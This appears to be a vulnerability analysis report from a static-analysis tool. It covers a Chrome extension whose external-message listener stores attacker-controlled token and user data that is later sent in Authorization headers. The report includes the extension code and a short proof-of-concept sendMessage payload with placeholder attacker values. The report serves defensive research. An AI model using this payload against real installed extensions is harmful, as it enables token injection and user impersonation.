# CoCo Analysis: jdfhemclgecoihmmkjnogjlbjjleecmb

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (chrome_storage_local_set_sink)

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jdfhemclgecoihmmkjnogjlbjjleecmb/opgen_generated_files/bg.js
Line 965: chrome.runtime.onMessageExternal.addListener((function(e,t,r){
Line 965: chrome.storage.local.set({token:e.tokenData,user:e.userData},null)

**Code:**

```javascript
// Background script - background.min.js (line 965)
chrome.runtime.onMessageExternal.addListener((function(e,t,r){
  // e.tokenData and e.userData are attacker-controlled from external message
  chrome.storage.local.set({token:e.tokenData,user:e.userData},null); // Storage poisoning

  if(chrome.runtime.setUninstallURL){
    const t="https://www.get-ecofy.com/uninstall_extension?token="+e.tokenData.access_token;
    chrome.runtime.setUninstallURL(t)
  }
  n()
}))

// Later in code, the poisoned storage is used:
function m(e,t){
  return fetch(e,{method:"GET",headers:{Authorization:t}}).then((function(e){
    if(!e.ok)throw e;
    return e.json()
  }))
}

// Storage values are read and used in multiple places:
chrome.storage.local.get(["partner_urls","token","partner_shops_checked_at","user"],(function(e){
  r=e,p()
}))

// Token is used in fetch operations:
const o="Bearer "+r.token.access_token;
fetch("https://www.get-ecofy.com/api/shops/activation",{
  method:"POST",
  headers:{Accept:"application/json","Content-Type":"application/json",Authorization:o,...}
})
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any webpage whitelisted in manifest (https://www.get-ecofy.com/confirmation-completed*)
// or localhost:3000/confirmation-completed*
chrome.runtime.sendMessage(
  "jdfhemclgecoihmmkjnogjlbjjleecmb",  // Extension ID
  {
    tokenData: {
      access_token: "attacker_malicious_token"
    },
    userData: {
      email: "attacker@evil.com",
      id: "evil_user_id"
    }
  }
);
```

**Impact:** Storage poisoning with retrieval and use. The attacker can inject malicious token and user data into chrome.storage.local. The poisoned token is later retrieved and used in Authorization headers for fetch requests to the developer's backend (https://www.get-ecofy.com/api/*). While the destination URLs are hardcoded to the developer's backend, the attacker can control the authentication credentials being sent, potentially impersonating users or causing the extension to authenticate API requests with attacker-controlled tokens.

---

## Sink 2: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink (user data)

Same flow as Sink 1, storing e.userData which is also attacker-controlled.
